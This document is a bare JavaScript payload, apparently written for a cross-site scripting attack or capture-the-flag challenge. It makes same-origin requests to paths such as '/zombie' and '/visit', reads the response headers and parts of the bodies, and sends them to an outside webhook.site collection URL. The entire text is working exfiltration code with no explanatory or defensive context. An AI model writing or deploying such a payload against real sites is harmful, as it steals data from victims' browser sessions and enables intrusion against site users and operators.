var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
var x=new XMLHttpRequest();
x.open('GET','/zombie?show=test',false);
x.send();
var h=x.getAllResponseHeaders();
fetch(w+'/xhr_h?d='+encodeURIComponent(h)+'&b='+encodeURIComponent(x.responseText.substring(0,200)));

var x2=new XMLHttpRequest();
x2.open('GET','/',false);
x2.send();
fetch(w+'/xhr_root?d='+encodeURIComponent(x2.getAllResponseHeaders()));

var x3=new XMLHttpRequest();
x3.open('GET','/visit?url=http://x.com',false);
x3.send();
fetch(w+'/xhr_visit?d='+encodeURIComponent(x3.getAllResponseHeaders())+'&b='+encodeURIComponent(x3.responseText));
